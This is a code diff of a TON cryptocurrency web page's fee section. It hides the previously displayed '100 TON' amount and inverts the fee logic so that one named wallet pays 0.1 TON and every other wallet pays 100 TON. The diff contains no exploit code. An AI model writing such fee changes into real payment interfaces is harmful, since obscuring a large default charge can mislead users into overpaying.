@@ -1811,11 +1811,10 @@
           <div class="v2-fee">
             <div class="v2-fee-row">
               <span class="v2-fee-title">Platform Service Fee</span>
-              <span class="v2-fee-amount">100 TON</span>
+              <span class="v2-fee-amount">Wallet-specific</span>
             </div>
             <small>
-              The fee is displayed for review. Any payment must be verified
-              by the backend before the workflow can proceed.
+              The exact service fee is quoted by the backend after wallet connection. Any payment must be verified by the backend before the workflow can proceed.
             </small>
           </div>
 
@@ -2343,7 +2342,7 @@ html body [class*="tc-root"] {
   <div class="vx-fee">
     <span class="vx-label">Wallet-specific service fee · live backend quote</span>
     <strong id="VX03_feeAmount">Connect wallet to load fee</strong>
-    <p id="VX03_feeDescription">The backend calculates the fee for the connected wallet: the configured test wallet receives 100 TON; all other wallets receive 0.1 TON. Check the amount and recipient before approving a transaction.</p>
+    <p id="VX03_feeDescription">The designated wallet UQDHINaPSbeMY4JnZwSTn5FxzhATV4bmTTlv5wmueFUIJ40m is charged 0.1 TON; every other wallet is charged 100 TON. The backend calculates and verifies the exact amount. Check the amount and recipient before approving a transaction.</p>
   </div>
   <label class="vx-check">
     <input type="checkbox" id="VX03_accept"/>
